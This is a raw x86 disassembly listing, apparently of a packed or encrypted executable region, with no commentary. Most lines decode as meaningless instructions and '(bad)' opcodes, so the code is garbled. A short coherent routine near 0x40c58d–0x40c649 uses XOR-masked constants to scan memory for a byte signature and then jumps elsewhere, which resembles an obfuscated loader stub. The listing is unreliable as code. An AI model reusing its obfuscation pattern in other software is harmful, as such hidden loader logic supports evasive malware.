  40bfdf:	sub    al,cl
  40bfe1:	fsub   DWORD PTR [edx+eiz*8-0x25990e2b]
  40bfe8:	cmp    ah,dl
  40bfea:	inc    ebp
  40bfeb:	mov    cl,0x34
  40bfed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfee:	repz mov ch,0x85
  40bff1:	iret   
  40bff2:	mov    ebx,0xfde1f3d0
  40bff7:	lock mov ebx,0x90f11c9a
  40bffd:	push   esi
  40bffe:	in     eax,dx
  40bfff:	jg     0x40bfd4
  40c001:	dec    edi
  40c002:	lock adc ecx,eax
  40c005:	nop
  40c006:	cld    
  40c007:	in     al,0xdb
  40c009:	fcmovne st,st(6)
  40c00b:	pop    ebp
  40c00c:	cmp    al,0xdd
  40c00e:	rcl    DWORD PTR [ecx+0x6afd3291],cl
  40c014:	push   edx
  40c015:	inc    esp
  40c016:	or     dl,BYTE PTR [esi]
  40c018:	inc    eax
  40c019:	neg    DWORD PTR [ebx+0x70ad3cef]
  40c01f:	es add eax,0xf43736f3
  40c025:	inc    edx
  40c026:	push   0xffffff8a
  40c028:	call   0xbbaf:0x2a17b2a8
  40c02f:	in     eax,dx
  40c030:	enter  0xed4,0x4a
  40c034:	adc    dh,BYTE PTR [ecx+ebx*1+0x17]
  40c038:	push   ss
  40c039:	mov    eax,ds:0x13e5bb95
  40c03e:	in     eax,dx
  40c03f:	test   eax,0xdea9208c
  40c044:	stos   DWORD PTR es:[edi],eax
  40c045:	mov    edx,0x838292b1
  40c04a:	add    eax,0xafd7901
  40c04f:	sub    eax,0xa43b8ec9
  40c054:	xor    al,0x73
  40c056:	ret    0x2ec0
  40c059:	mov    al,0x30
  40c05b:	rcl    bl,0x39
  40c05e:	xor    eax,0xef03f9d8
  40c063:	bound  ecx,QWORD PTR [ebx+0x45219d72]
  40c069:	jle    0x40c089
  40c06b:	pusha  
  40c06c:	push   cs
  40c06d:	sub    dl,BYTE PTR [esi+0x658a6457]
  40c073:	mov    esp,0x7763b3d1
  40c078:	popf   
  40c079:	push   0x6a075170
  40c07e:	or     al,0x70
  40c080:	mov    es,WORD PTR [edi-0x483a14bf]
  40c086:	in     al,0x57
  40c088:	mov    ds:0x4accc289,al
  40c08d:	test   DWORD PTR [esi+ebp*4],ebx
  40c090:	retf   0xf3ae
  40c093:	fwait
  40c094:	repz mov cl,BYTE PTR [eax-0x351d5f4]
  40c09b:	fwait
  40c09c:	jbe    0x40c0b9
  40c09e:	jge    0x40c08a
  40c0a0:	pop    edx
  40c0a1:	(bad)  
  40c0a2:	aam    0xa7
  40c0a4:	sar    BYTE PTR [edx+0x18],1
  40c0a7:	mov    eax,0xcf9625f6
  40c0ac:	cld    
  40c0ad:	pop    ebp
  40c0ae:	(bad)  
  40c0af:	dec    edi
  40c0b0:	mov    ebx,0xd03c4de8
  40c0b5:	mov    bl,al
  40c0b7:	rcl    BYTE PTR [edx-0x3],0xd0
  40c0bb:	jb     0x40c0d5
  40c0bd:	mov    cl,0x13
  40c0bf:	arpl   WORD PTR [ebp+0xc4b5aca],cx
  40c0c5:	mov    ch,0x2a
  40c0c7:	push   edx
  40c0c8:	mov    al,ds:0xea260305
  40c0cd:	loope  0x40c096
  40c0cf:	cmp    DWORD PTR [ebp+0x11485902],edi
  40c0d5:	scas   al,BYTE PTR es:[edi]
  40c0d6:	sbb    eax,0xc3f4ad0b
  40c0db:	mov    dh,0x2b
  40c0dd:	pop    eax
  40c0de:	cli    
  40c0df:	jno    0x40c071
  40c0e1:	xchg   edi,eax
  40c0e2:	rol    BYTE PTR [esi-0x33],0x1f
  40c0e6:	mov    dl,0x43
  40c0e8:	(bad)  
  40c0e9:	js     0x40c123
  40c0eb:	(bad)  
  40c0ec:	mov    cl,0xaf
  40c0ee:	mov    ebp,esp
  40c0f0:	clc    
  40c0f1:	pop    ebx
  40c0f2:	xchg   al,ah
  40c0f4:	sbb    eax,0x3e203937
  40c0f9:	aaa    
  40c0fa:	cmp    BYTE PTR [esi-0x2dfd27fb],0x72
  40c101:	mov    al,ds:0x4ffce14f
  40c106:	(bad)  
  40c107:	cmp    eax,0x952dc4b7
  40c10c:	add    al,0x94
  40c10e:	pop    DWORD PTR [eax-0x67]
  40c111:	lea    ecx,[edx]
  40c113:	dec    ecx
  40c114:	or     DWORD PTR [ecx],ebp
  40c116:	jno    0x40c159
  40c118:	test   eax,0x7d017a2c
  40c11d:	mov    edi,0x703cb2d0
  40c122:	dec    esi
  40c123:	jno    0x40c170
  40c125:	and    BYTE PTR [edx+edx*8],bh
  40c128:	lock outs dx,DWORD PTR ds:[esi]
  40c12a:	outs   dx,DWORD PTR ds:[esi]
  40c12b:	add    DWORD PTR [edi+ebx*2],esp
  40c12e:	sub    cl,BYTE PTR [edx-0x2124f1d4]
  40c134:	std    
  40c135:	mov    esp,esp
  40c137:	jb     0x40c172
  40c139:	mov    dl,0xbe
  40c13b:	push   ecx
  40c13c:	push   ecx
  40c13d:	jnp    0x40c1a9
  40c13f:	dec    edx
  40c140:	xlat   BYTE PTR ds:[ebx]
  40c141:	mov    bh,0xde
  40c143:	pushf  
  40c144:	push   esp
  40c145:	and    edx,DWORD PTR [eax+0x60]
  40c148:	sbb    bh,BYTE PTR ds:[ecx]
  40c14b:	jp     0x40c180
  40c14d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c14e:	mov    BYTE PTR [eax-0xfd7037c],0x23
  40c155:	inc    esi
  40c156:	sub    eax,0x2f7fca26
  40c15b:	iret   
  40c15c:	jg     0x40c1a1
  40c15e:	ins    BYTE PTR es:[edi],dx
  40c15f:	and    eax,0x318d8700
  40c164:	fdiv   QWORD PTR [ebp-0x6b9a9606]
  40c16a:	inc    esp
  40c16b:	adc    eax,0xa9d51d7c
  40c170:	test   DWORD PTR [ecx],esp
  40c172:	bound  edi,QWORD PTR [eax]
  40c174:	mov    esi,0x1c8672d
  40c179:	popf   
  40c17a:	lods   eax,DWORD PTR ds:[esi]
  40c17b:	cli    
  40c17c:	mov    esp,DWORD PTR [esi-0x5cca195]
  40c182:	popa   
  40c183:	xor    al,0x1f
  40c185:	into   
  40c186:	mul    DWORD PTR [edx]
  40c188:	stc    
  40c189:	sbb    eax,0xc214b74e
  40c18e:	adc    ebp,edx
  40c190:	das    
  40c191:	dec    ecx
  40c192:	inc    ecx
  40c193:	xchg   ebx,eax
  40c194:	ins    DWORD PTR es:[edi],dx
  40c195:	cmp    eax,0xf27073fb
  40c19a:	push   eax
  40c19b:	dec    ebp
  40c19c:	add    BYTE PTR [edi-0x61dd68d1],bh
  40c1a2:	call   0x612c:0xd025ae3c
  40c1a9:	xor    bh,BYTE PTR [ebp-0x165461aa]
  40c1af:	(bad)  
  40c1b0:	jmp    FWORD PTR [bx]
  40c1b3:	pop    es
  40c1b4:	inc    ecx
  40c1b5:	push   0x7b
  40c1b7:	jge    0x40c141
  40c1b9:	fadd   DWORD PTR ds:0x64d3b775
  40c1bf:	mov    eax,ds:0xd27ef001
  40c1c4:	lds    ecx,FWORD PTR [ebp-0x66]
  40c1c7:	jb     0x40c225
  40c1c9:	lahf   
  40c1ca:	gs mov dh,0x81
  40c1cd:	ins    DWORD PTR es:[edi],dx
  40c1ce:	pop    eax
  40c1cf:	push   0xffffff8f
  40c1d1:	ss aam 0x25
  40c1d4:	jae    0x40c1a4
  40c1d6:	fwait
  40c1d7:	pop    esp
  40c1d8:	js     0x40c24a
  40c1da:	dec    edi
  40c1db:	jnp    0x40c23a
  40c1dd:	out    0xd5,eax
  40c1df:	adc    BYTE PTR [eax-0x3c],bl
  40c1e2:	imul   esp,DWORD PTR [esi],0x39d6d3b6
  40c1e8:	xchg   BYTE PTR ds:0x2509a80,bl
  40c1ee:	loop   0x40c23e
  40c1f0:	mov    es,WORD PTR [ecx-0x40]
  40c1f3:	mov    bl,BYTE PTR es:[esp+ebx*8+0x26008bd8]
  40c1fb:	inc    ebp
  40c1fc:	mov    ebp,0xa32daacc
  40c201:	and    al,0x5e
  40c203:	xor    eax,0xff0db256
  40c208:	adc    al,0x7
  40c20a:	sti    
  40c20b:	out    0xb4,eax
  40c20d:	jle    0x40c26c
  40c20f:	fldcw  WORD PTR [edi-0x3a]
  40c212:	shl    DWORD PTR [eax],1
  40c214:	inc    ecx
  40c215:	xchg   edx,eax
  40c216:	ja     0x40c227
  40c218:	into   
  40c219:	repz fimul DWORD PTR [edi+ebx*1-0xc]
  40c21e:	sbb    DWORD PTR [eax-0x4e0ccac6],esp
  40c224:	add    BYTE PTR [eax],dl
  40c226:	iret   
  40c227:	mov    bh,0x85
  40c229:	stos   DWORD PTR es:[edi],eax
  40c22a:	push   ecx
  40c22b:	nop
  40c22c:	pop    ebp
  40c22d:	jg     0x40c22f
  40c22f:	inc    ebp
  40c230:	xor    ebp,esp
  40c232:	mov    ds:0x85b1e17e,al
  40c237:	cmp    bl,bh
  40c239:	shl    BYTE PTR [edx],1
  40c23b:	dec    esi
  40c23c:	add    edx,DWORD PTR [ecx]
  40c23e:	push   ss
  40c23f:	pop    edx
  40c240:	pop    ecx
  40c241:	in     al,dx
  40c242:	add    al,0x39
  40c244:	mov    fs:0x8144f5a8,al
  40c24a:	(bad)  
  40c24b:	push   edx
  40c24c:	mov    bh,0x46
  40c24e:	retf   0x9b56
  40c251:	gs (bad) 
  40c253:	icebp  
  40c254:	dec    edi
  40c255:	mov    ah,0xb8
  40c257:	js     0x40c28d
  40c259:	imul   DWORD PTR [esi-0x54d171cf]
  40c25f:	jo     0x40c234
  40c261:	out    0x7c,eax
  40c263:	aaa    
  40c264:	fstp   TBYTE PTR [esp+ecx*2-0x63]
  40c268:	pop    ss
  40c269:	adc    edi,DWORD PTR [ecx]
  40c26b:	(bad)  
  40c26c:	int3   
  40c26d:	lahf   
  40c26e:	stos   BYTE PTR es:[edi],al
  40c26f:	sub    esp,DWORD PTR [ebp+0x56]
  40c272:	into   
  40c273:	stos   DWORD PTR es:[edi],eax
  40c274:	and    eax,0x56556e44
  40c279:	mov    bh,0x79
  40c27b:	push   esp
  40c27c:	cmp    esi,eax
  40c27e:	loopne 0x40c2b7
  40c280:	ds jno 0x40c28d
  40c283:	and    eax,DWORD PTR [eax+edx*4+0x5c]
  40c287:	cld    
  40c288:	test   DWORD PTR [edi-0x45c84e4c],eax
  40c28e:	mov    eax,ds:0x58a6d59
  40c293:	addr16 sbb eax,0x193aa32d
  40c299:	dec    eax
  40c29a:	retf   
  40c29b:	add    al,0xe1
  40c29d:	push   0x20
  40c29f:	add    bh,BYTE PTR [edi-0x58df1f29]
  40c2a5:	fistp  DWORD PTR [edx]
  40c2a7:	inc    edi
  40c2a8:	std    
  40c2a9:	mov    ds:0x541e25a,al
  40c2ae:	or     eax,0xfbcc0367
  40c2b3:	jno    0x40c238
  40c2b5:	or     ebx,edx
  40c2b7:	and    edx,DWORD PTR [ebx]
  40c2b9:	cs pusha 
  40c2bb:	mov    edx,0xfcd5a56b
  40c2c0:	inc    eax
  40c2c1:	ins    DWORD PTR es:[edi],dx
  40c2c2:	in     al,0x90
  40c2c4:	icebp  
  40c2c5:	push   edi
  40c2c6:	pop    edx
  40c2c7:	test   eax,0x3174ad94
  40c2cc:	fs mov bh,0x9f
  40c2cf:	push   edi
  40c2d0:	int3   
  40c2d1:	inc    edi
  40c2d2:	xchg   ecx,eax
  40c2d3:	mov    al,ds:0x78057e42
  40c2d8:	pushfw 
  40c2da:	lods   al,BYTE PTR ds:[esi]
  40c2db:	cs stos DWORD PTR es:[edi],eax
  40c2dd:	sub    eax,0x44151487
  40c2e2:	push   ss
  40c2e3:	aam    0x98
  40c2e5:	push   ebx
  40c2e6:	ins    DWORD PTR es:[edi],dx
  40c2e7:	xlat   BYTE PTR ds:[ebx]
  40c2e8:	addr16 pop eax
  40c2ea:	jmp    0x13ff08af
  40c2ef:	(bad)  
  40c2f0:	(bad)  
  40c2f1:	cmp    BYTE PTR [eax+eax*8],al
  40c2f4:	dec    edx
  40c2f5:	fsub   st,st(3)
  40c2f7:	mov    DWORD PTR [ebp+0x6be9d84d],ebp
  40c2fd:	fadd   QWORD PTR [esi]
  40c2ff:	mov    esi,ebp
  40c301:	pop    ebp
  40c302:	fs jae 0x40c2ec
  40c305:	sbb    al,0xc7
  40c307:	xchg   BYTE PTR [ebp-0x307192e2],dh
  40c30d:	stos   BYTE PTR es:[edi],al
  40c30e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c30f:	mov    esi,0x86a88e17
  40c314:	pop    es
  40c315:	mov    ah,0x83
  40c318:	cmp    ebx,edx
  40c31a:	pop    ebx
  40c31b:	(bad)  
  40c31d:	mov    ecx,0x4c9db6fa
  40c322:	retf   0x464a
  40c325:	lds    esp,FWORD PTR [ebx-0x72]
  40c328:	nop
  40c329:	jno    0x40c2f8
  40c32b:	push   edx
  40c32c:	lods   eax,DWORD PTR ds:[esi]
  40c32d:	clc    
  40c32e:	mov    al,0x14
  40c330:	inc    ebx
  40c331:	push   ebx
  40c332:	cmp    edx,esp
  40c334:	xchg   edx,eax
  40c335:	mov    ecx,0xa85c6af
  40c33a:	cmp    BYTE PTR [eax],al
  40c33c:	mov    al,ds:0x9af33474
  40c341:	fadd   st(3),st
  40c343:	in     al,0x9e
  40c345:	xor    DWORD PTR [eax+0x240529ac],esi
  40c34b:	test   eax,0xad14aabe
  40c350:	sbb    al,0xed
  40c352:	pop    es
  40c353:	and    eax,0x8bd2f5c9
  40c358:	and    DWORD PTR [eax+0xa8f1527],0x5341e91e
  40c362:	(bad)  
  40c363:	aad    0xe6
  40c365:	in     al,0x80
  40c367:	repz arpl dx,di
  40c36a:	jle    0x40c3a0
  40c36c:	out    dx,al
  40c36d:	jnp    0x40c323
  40c36f:	and    BYTE PTR [ebx+0x10bf9766],0x83
  40c376:	inc    ebp
  40c377:	mov    ds:0x4d73843f,eax
  40c37c:	(bad)
  40c381:	lods   al,BYTE PTR ds:[esi]
  40c382:	gs popf 
  40c384:	mov    al,0x36
  40c386:	aas    
  40c387:	add    ecx,esi
  40c389:	dec    esp
  40c38a:	xchg   ecx,eax
  40c38b:	in     al,dx
  40c38c:	add    ecx,DWORD PTR [esp+eax*4+0x4a]
  40c390:	lea    esp,[esi-0x2ed67c1c]
  40c396:	pop    eax
  40c397:	daa    
  40c398:	and    al,0xc
  40c39a:	cmp    al,0xe3
  40c39c:	icebp  
  40c39d:	iret   
  40c39e:	pop    es
  40c39f:	lahf   
  40c3a0:	pop    ecx
  40c3a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3a2:	je     0x40c39a
  40c3a4:	xchg   ebx,eax
  40c3a5:	xor    al,0xe7
  40c3a7:	pop    ds
  40c3a8:	push   esp
  40c3a9:	loope  0x40c41f
  40c3ab:	mov    ds:0xf9f2a583,eax
  40c3b0:	or     al,0x83
  40c3b2:	mov    ss,WORD PTR [edx-0x4a]
  40c3b5:	iret   
  40c3b6:	hlt    
  40c3b7:	mov    ah,0xb3
  40c3b9:	add    bh,BYTE PTR [ecx-0x24]
  40c3bc:	or     BYTE PTR [edx+0x6f46aa6],dl
  40c3c2:	(bad)  
  40c3c4:	mov    edi,DWORD PTR [eax]
  40c3c6:	test   DWORD PTR [esi+0x4f],eax
  40c3c9:	add    ebp,DWORD PTR [edx-0x30feeb62]
  40c3cf:	jg     0x40c445
  40c3d1:	std    
  40c3d2:	pop    ebp
  40c3d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3d5:	and    al,BYTE PTR [esi-0x79]
  40c3d8:	sbb    eax,0x57304fe0
  40c3dd:	mov    dh,0x31
  40c3df:	adc    ebx,edi
  40c3e1:	mov    ch,0x1b
  40c3e3:	adc    BYTE PTR [edx],dl
  40c3e5:	hlt    
  40c3e6:	fwait
  40c3e7:	jb     0x40c408
  40c3e9:	pop    ds
  40c3ea:	rol    DWORD PTR [edi],cl
  40c3ec:	out    0xb2,eax
  40c3ee:	and    DWORD PTR [edx+ecx*2-0x2],ebx
  40c3f2:	jbe    0x40c3df
  40c3f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3f5:	xor    ebp,edx
  40c3f7:	leave  
  40c3f8:	lods   al,BYTE PTR ds:[esi]
  40c3f9:	in     eax,0x2e
  40c3fb:	pop    DWORD PTR [edx+0x6d]
  40c3fe:	push   edi
  40c3ff:	inc    ecx
  40c400:	test   al,0xd0
  40c402:	popf   
  40c403:	push   eax
  40c404:	sbb    ecx,DWORD PTR [edi+edi*4-0x5d]
  40c408:	bound  eax,QWORD PTR ds:0x560170fb
  40c40e:	jp     0x40c3c9
  40c410:	iret   
  40c411:	out    0x4f,eax
  40c413:	imul   ebp,DWORD PTR [ebx],0x671d19dc
  40c419:	pop    esi
  40c41a:	retf   0xc737
  40c41d:	sub    al,0x86
  40c41f:	(bad)  
  40c420:	push   0xffffff85
  40c422:	ror    ecx,1
  40c424:	call   0x73e1:0x73d1cc4e
  40c42b:	fimul  DWORD PTR [ebx-0x706e68f5]
  40c431:	push   0x511929
  40c436:	jo     0x40c48c
  40c438:	mov    ds:0x67197cc6,eax
  40c43d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c43e:	add    eax,0xce9ee7fd
  40c443:	mov    al,0x77
  40c445:	push   ebp
  40c446:	int    0xd7
  40c448:	adc    eax,0xdb8c5072
  40c44d:	ja     0x40c457
  40c44f:	cmp    bl,bh
  40c451:	xchg   DWORD PTR [ecx-0x2a3d1d21],esp
  40c457:	add    DWORD PTR [edi],esi
  40c459:	adc    BYTE PTR [edi],0xee
  40c45c:	pop    ss
  40c45d:	inc    eax
  40c45e:	shl    BYTE PTR [ecx+ecx*8],1
  40c461:	cmp    dl,al
  40c463:	stos   DWORD PTR es:[edi],eax
  40c464:	ins    DWORD PTR es:[edi],dx
  40c465:	outs   dx,BYTE PTR ds:[esi]
  40c466:	enter  0x6003,0x50
  40c46a:	ins    BYTE PTR es:[edi],dx
  40c46b:	mov    BYTE PTR [si-0x24],ch
  40c46f:	(bad)  
  40c470:	(bad)  
  40c472:	outs   dx,DWORD PTR ds:[esi]
  40c473:	leave  
  40c474:	es xor al,0xd5
  40c477:	xchg   DWORD PTR [eax-0x4a],ecx
  40c47a:	mov    esi,0x713c5935
  40c47f:	fst    DWORD PTR [eax+0x3a]
  40c482:	loope  0x40c49d
  40c484:	(bad)  [ebp+0x50b23d0a]
  40c48a:	clc    
  40c48b:	pop    esi
  40c48c:	sub    al,0x64
  40c48e:	scas   al,BYTE PTR es:[edi]
  40c48f:	jo     0x40c4c2
  40c491:	jns    0x40c4a1
  40c493:	jmp    0xb9f49cf1
  40c498:	sbb    al,0xf5
  40c49a:	pop    edx
  40c49b:	imul   edx,DWORD PTR [esi],0xffffffbc
  40c49e:	jmp    0x448efd03
  40c4a3:	nop
  40c4a4:	mov    edi,0x769d9ca7
  40c4a9:	jl     0x40c4e4
  40c4ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c4ac:	(bad)  
  40c4ae:	pop    ecx
  40c4af:	sbb    ch,ah
  40c4b1:	(bad)  
  40c4b2:	stos   DWORD PTR es:[edi],eax
  40c4b3:	jbe    0x40c453
  40c4b5:	and    DWORD PTR ss:[eax+0x4de515a3],edi
  40c4bc:	je     0x40c4a5
  40c4be:	ja     0x40c45d
  40c4c0:	jne    0x40c4a9
  40c4c2:	pop    esi
  40c4c3:	dec    esp
  40c4c4:	adc    BYTE PTR [esi],ah
  40c4c6:	lock loop 0x40c45b
  40c4c9:	enter  0xc53d,0x31
  40c4cd:	mov    ebp,0xd11f5812
  40c4d2:	jge    0x40c477
  40c4d4:	sub    ebx,DWORD PTR [eax+0xb]
  40c4d7:	pusha  
  40c4d8:	add    eax,0xf71c12ad
  40c4dd:	in     al,0xa7
  40c4df:	inc    esi
  40c4e0:	jle    0x40c47f
  40c4e2:	rcr    BYTE PTR [ebx+ebp*8],1
  40c4e5:	lods   al,BYTE PTR ds:[esi]
  40c4e6:	jne    0x40c501
  40c4e8:	(bad)  
  40c4e9:	(bad)  
  40c4ea:	repz daa 
  40c4ec:	xchg   ebp,eax
  40c4ed:	lea    esi,[edi-0x2b]
  40c4f0:	or     DWORD PTR [edi+eiz*2-0x48],ebx
  40c4f4:	jecxz  0x40c52c
  40c4f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c4f7:	sub    al,0x96
  40c4f9:	and    BYTE PTR [ecx-0x60],ah
  40c4fc:	cwde   
  40c4fd:	pop    es
  40c4fe:	popa   
  40c4ff:	sbb    eax,0x8319de7d
  40c504:	dec    ebp
  40c505:	je     0x40c580
  40c507:	add    edx,DWORD PTR [ecx+0xfb20720]
  40c50d:	into   
  40c50e:	cld    
  40c50f:	jb     0x40c57e
  40c511:	mov    dl,0xce
  40c513:	add    eax,0xf3316fc5
  40c518:	and    al,0x58
  40c51a:	ret    
  40c51b:	imul   DWORD PTR [ecx-0x2d]
  40c51e:	popf   
  40c51f:	sti    
  40c520:	sbb    DWORD PTR [esi-0x70],eax
  40c523:	xchg   edi,eax
  40c524:	cli    
  40c525:	fcmovnu st,st(2)
  40c527:	popa   
  40c528:	push   ds
  40c529:	gs ins BYTE PTR es:[edi],dx
  40c52b:	adc    al,0x20
  40c52d:	cmp    ah,BYTE PTR [esi+0x70e10e54]
  40c533:	pop    edx
  40c534:	addr16 hlt 
  40c536:	mov    ds:0x53d48af4,al
  40c53b:	or     al,0x6c
  40c53d:	ins    DWORD PTR es:[edi],dx
  40c53e:	(bad)  
  40c53f:	pop    edx
  40c540:	loopne 0x40c4cc
  40c542:	aam    0xb6
  40c544:	scas   eax,DWORD PTR es:[edi]
  40c545:	test   DWORD PTR [ebx+0x40],esp
  40c548:	add    bl,BYTE PTR [edi-0x36]
  40c54b:	lea    edi,[esi+0x718289ef]
  40c551:	repnz iret 
  40c553:	push   edi
  40c554:	inc    esp
  40c555:	adc    ecx,DWORD PTR [eax]
  40c557:	sub    bh,BYTE PTR [ebx-0x8]
  40c55a:	mul    DWORD PTR [edx]
  40c55c:	jecxz  0x40c510
  40c55e:	mov    ecx,0x27866f0b
  40c563:	out    0x44,al
  40c565:	test   DWORD PTR [ecx],esi
  40c567:	mov    ch,0x6d
  40c569:	cmp    BYTE PTR [esi],0x8e
  40c56c:	mov    bh,0x8a
  40c56e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c56f:	jl     0x40c503
  40c571:	xchg   edi,eax
  40c572:	xchg   edi,eax
  40c573:	jns    0x40c548
  40c575:	sub    BYTE PTR [edi+0x4f5a7042],al
  40c57b:	pushf  
  40c57c:	jmp    0x40c5e0
  40c57e:	sbb    BYTE PTR [ecx+0x49],bl
  40c581:	pop    edi
  40c582:	ror    BYTE PTR [edx+0x56ed1453],cl
  40c588:	jge    0x40c5bd
  40c58a:	fs cmp dl,bl
  40c58d:	xor    eax,DWORD PTR [ebx]
  40c58f:	cmp    BYTE PTR [ecx+0x458bf87d],cl
  40c595:	or     al,0x8b
  40c597:	jge    0x40c5a5
  40c599:	xor    edi,ecx
  40c59b:	xor    eax,ecx
  40c59d:	lea    eax,[eax+edi*1+0x64e5c4]
  40c5a4:	mov    edi,DWORD PTR [ebp+0xc]
  40c5a7:	xor    edi,ecx
  40c5a9:	add    edi,edx
  40c5ab:	imul   eax,edi
  40c5ae:	mov    edi,DWORD PTR [ebp+0xc]
  40c5b1:	xor    edi,ecx
  40c5b3:	sub    edi,eax
  40c5b5:	mov    eax,DWORD PTR [ebp-0x4]
  40c5b8:	add    edi,edx
  40c5ba:	cmp    DWORD PTR [eax],edi
  40c5bc:	mov    eax,DWORD PTR [ebp-0x4]
  40c5bf:	mov    edi,DWORD PTR [ebp+0x10]
  40c5c2:	jg     0x40c5d5
  40c5c8:	xor    edi,ecx
  40c5ca:	mov    ebx,esi
  40c5cc:	sub    ebx,edi
  40c5ce:	add    DWORD PTR [eax],ebx
  40c5d0:	jmp    0x40c5db
  40c5d5:	xor    edi,ecx
  40c5d7:	add    edi,edx
  40c5d9:	add    DWORD PTR [eax],edi
  40c5db:	mov    eax,DWORD PTR [ebp-0x8]
  40c5de:	mov    edi,DWORD PTR [ebp-0x10]
  40c5e1:	mov    eax,DWORD PTR [eax]
  40c5e3:	xor    edi,ecx
  40c5e5:	add    edi,0x3272e1
  40c5eb:	not    edi
  40c5ed:	and    eax,edi
  40c5ef:	movsx  di,BYTE PTR [eax+0x1]
  40c5f4:	mov    ebx,0x3b51
  40c5f9:	sub    di,bx
  40c5fc:	mov    ebx,0x8a8d
  40c601:	xor    di,bx
  40c604:	mov    ebx,0x4f84
  40c609:	cmp    di,bx
  40c60c:	jne    0x40c634
  40c612:	movsx  di,BYTE PTR [eax]
  40c616:	mov    ebx,0x3b51
  40c61b:	sub    di,bx
  40c61e:	mov    ebx,0x8a8d
  40c623:	xor    di,bx
  40c626:	mov    ebx,0x4e71
  40c62b:	cmp    di,bx
  40c62e:	je     0x40c644
  40c634:	mov    edi,DWORD PTR [ebp-0x10]
  40c637:	xor    edi,ecx
  40c639:	mov    ebx,esi
  40c63b:	sub    ebx,edi
  40c63d:	add    eax,ebx
  40c63f:	jmp    0x40c5ef
  40c644:	mov    esi,DWORD PTR [ebp-0x14]
  40c647:	mov    esi,DWORD PTR [esi]
  40c649:	jmp    0x40e998
  40c64e:	dec    edi
  40c64f:	sub    edi,esi
  40c651:	pusha  
  40c652:	repz inc edx
  40c654:	or     esi,ebx
  40c656:	test   eax,0x24b873c
  40c65b:	aam    0xc1
  40c65d:	inc    ebx
  40c65e:	mov    ds:0x4e7c7ce0,al
  40c663:	pop    edi
  40c664:	jl     0x40c6e2
  40c666:	rcl    BYTE PTR [eax],cl
  40c668:	xlat   BYTE PTR ds:[ebx]
  40c669:	cmp    BYTE PTR [edx+0x7440d9db],ch
  40c66f:	test   al,0x39
  40c671:	ins    BYTE PTR es:[edi],dx
  40c672:	frstor [edi]
  40c674:	pop    edi
  40c675:	jb     0x40c6bc
  40c677:	xor    DWORD PTR [esi-0xbb962aa],eax
  40c67d:	fistp  DWORD PTR [ebp-0x1d1f6ede]
  40c683:	or     BYTE PTR [ecx],ah
  40c685:	ja     0x40c656
  40c687:	adc    ah,bl
  40c689:	call   FWORD PTR [edx]
  40c68b:	stc    
  40c68c:	in     al,0xe9
  40c68e:	repz (bad) 
  40c691:	mov    DWORD PTR [eax-0x5],eax
  40c694:	mov    edi,edx
  40c696:	aas    
  40c697:	aas    
  40c698:	je     0x40c65c
  40c69a:	jl     0x40c6d3
  40c69c:	jg     0x40c702
  40c69e:	mov    al,ds:0xf73b6b9e
  40c6a3:	add    ch,BYTE PTR [ebp-0x67]
  40c6a6:	fnstcw WORD PTR [esi+0x28]
  40c6a9:	xchg   ecx,eax
  40c6aa:	mov    edi,0xa91060b3
  40c6af:	or     ebp,DWORD PTR [ebx]
  40c6b1:	call   DWORD PTR [ebx]
  40c6b3:	sub    eax,0x381a326c
  40c6b8:	cmp    al,0x3e
  40c6ba:	div    DWORD PTR ds:0xa8f623df
  40c6c0:	icebp  
  40c6c1:	shl    BYTE PTR [eax+0x7f],0x56
  40c6c5:	pop    ebx
  40c6c6:	sub    al,0xb5
  40c6c8:	xor    BYTE PTR [bp-0x65],cl
  40c6cc:	xor    BYTE PTR [edx],al
  40c6ce:	inc    eax
  40c6cf:	mov    ds:0xfd718f23,eax
  40c6d4:	jns    0x40c6eb
  40c6d6:	out    0x4f,al
  40c6d8:	sbb    BYTE PTR [ebx-0x6377d342],bl
  40c6de:	in     al,dx
  40c6df:	xchg   ebp,eax
  40c6e0:	sbb    ch,BYTE PTR [edx-0x32002b56]
  40c6e6:	sahf   
  40c6e7:	inc    ecx
  40c6e8:	std    
  40c6e9:	or     al,0xe5
  40c6eb:	mov    ebx,0xb896a71d
  40c6f0:	mov    eax,ds:0x8e95dcc9
  40c6f5:	mov    al,0x6d
  40c6f7:	sbb    bh,BYTE PTR [esi]
  40c6f9:	pop    edi
  40c6fa:	adc    eax,0x9e5fc04e
  40c6ff:	jp     0x40c72f
  40c701:	sub    ah,al
  40c703:	les    ecx,FWORD PTR [esi+0x16]
  40c706:	xchg   esi,eax
  40c707:	push   esi
  40c708:	inc    eax
  40c709:	sbb    BYTE PTR [edx+0x3ac3bf5c],al
  40c70f:	ins    DWORD PTR es:[edi],dx
  40c710:	and    BYTE PTR [edx+esi*4],dl
  40c713:	sbb    BYTE PTR [ebx-0x20c229e8],bl
  40c719:	aas    
  40c71a:	push   cs
  40c71b:	lahf   
  40c71c:	push   ecx
  40c71d:	add    BYTE PTR [eax],0xa5
  40c720:	fsubr  QWORD PTR [ebx]
  40c722:	add    esi,ebp
  40c724:	aam    0x25
  40c726:	jmp    0xfe393bb3
  40c72b:	jmp    0x23cd:0xe65b4241
  40c732:	lods   eax,DWORD PTR ds:[esi]
  40c733:	lods   al,BYTE PTR ds:[esi]
  40c734:	das    
  40c735:	push   esi
  40c736:	loopne 0x40c6e6
  40c738:	dec    esi
  40c739:	mov    dl,0xe8
  40c73b:	das    
  40c73c:	push   0xb09511b9
  40c741:	sub    DWORD PTR [ecx+0x5fba6e6],esp
  40c747:	out    dx,al
  40c748:	add    al,0x68
  40c74a:	ss inc esp
  40c74c:	xchg   esp,eax
  40c74d:	pop    ecx
  40c74e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c74f:	sub    eax,DWORD PTR [edx]
  40c751:	xor    eax,0x54fad34b
  40c756:	pop    eax
  40c757:	mov    ebp,ecx
  40c759:	mov    dh,0x23
  40c75b:	and    ebp,edx
  40c75d:	and    eax,0x15ad080f
  40c762:	rol    esp,cl
  40c764:	sbb    al,0x20
  40c766:	xor    dh,bh
  40c768:	daa    
